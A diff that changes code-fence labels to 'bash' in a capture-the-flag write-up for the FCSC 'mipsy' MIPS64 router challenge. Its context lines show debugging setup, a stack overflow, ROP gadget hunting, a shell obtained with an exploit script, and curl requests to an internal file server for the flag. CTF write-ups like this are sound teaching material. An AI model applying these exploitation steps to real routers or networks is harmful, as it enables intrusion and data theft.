@@ -18,7 +18,7 @@ So basically we got this:
 >nc challenges2.france-cybersecurity-challenge.fr 4005
 
 And for debugging purposes administrators provided a Docker file:
-```
+```bash
 FROM debian:buster-slim
 RUN apt update
 RUN apt install -yq socat qemu-user libc6-mips64-cross
@@ -34,7 +34,7 @@ EXPOSE 1234
 CMD socat tcp-listen:4000,reuseaddr,fork exec:"qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy"
 ```
 So because it's not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting `/etc/ld.so.cache` and by the socat command on port 4000: 
-```
+```bash
 $ uname -a
 Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 $ sudo apt install socat qemu-user libc6-mips64-cross
@@ -49,7 +49,7 @@ $ sudo rm -f /etc/ld.so.cache
 $ socat tcp-listen:4000,reuseaddr,fork exec:"qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy"
 ```
 We can debug the running process with gdb-multiarch (with the path of my pwndbg's gdbinit to get an cleaner output).
-```
+```bash
 $ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
 Reading symbols from ./mipsy...
 (No debugging symbols found in ./mipsy)
@@ -71,13 +71,13 @@ print(io.recvuntil("] ").decode('utf-8'))
 ```
 
 Now we launch the python script to trigger the socat:
-```
+```bash
 $ python3 wu.py                                                               
 [+] Opening connection to localhost on port 4000: Done
 ```
 
 It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb: 
-```
+```bash
 Remote debugging using localhost:5445
 warning: Unable to find dynamic linker breakpoint function.
 GDB will be unable to debug shared library initializers
@@ -109,7 +109,7 @@ Do you need "set solib-search-path" or "set sysroot"?
 ```
 
 The process exited because we didn't inserted any breakpoints and so our python script outs this: 
-```
+```bash
 +---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
@@ -130,12 +130,12 @@ We're able to debug properly our process !
 ## Reverse Engineering 
 
 We can take a look at the binary by running the file command:
-```
+```bash
 $ file mipsy                                                                  
 mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
 ```
 So it's a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:
-```
+```bash
 +---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
@@ -266,7 +266,7 @@ So we discovered the stack based buffer overflow which allows us to overwrite th
 
 Since we understood the vulnerable function, we can represent the stackframe like that: 
 
-```
+```bash
 $saved_fp-0x90+----------------------+
               |                      |
               |                      |
@@ -431,17 +431,17 @@ An important thing to notice is that on mips architechture, when an instruction 
 And the good value for `$gp` is a constant from which the [`dla`](https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html) instruction addresses memory areas. And if we check the value of `$gp` in gdb, we got: `0x120048020`.
 
 To control the `$v1` register we can grep on the gadgets found by ROPgadget: 
-```
+```bash
 $ grep "ld \$v0, " gadgets | grep \$sp
 ```
 Then we got a lot of candidate which are not efficient. And if we're very careful we find an interesting gadget:
-```
+```bash
 0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
 ```
 It's perfect because it allows us to control the value of `$v0` and the value of the next gadget that we can store in `$t9` to jump on !
 
 We can apply process to find a gadget for $v1: 
-```
+```bash
 $ grep "ld \$v1, " gadgets | grep \$sp
 [skip]
 0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
@@ -565,7 +565,7 @@ io.interactive()
 
 According to the statements we need to read some files stored on the filer machine.
 So firstly let's run the exploit to get the shell:
-```
+```bash
 $ ./solve.py                                                                  
 [!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
 [!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
@@ -588,7 +588,7 @@ $
 ```
 
 We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:
-```
+```bash
 $ curl filer
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html>
@@ -608,7 +608,7 @@ $ curl filer
 ```
 
 It's a directory listing of the files stored in filer, and so we just have to `curl filer/flag` to get the flag:
-```
+```bash
 $ curl filer/flag
 FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
 ```
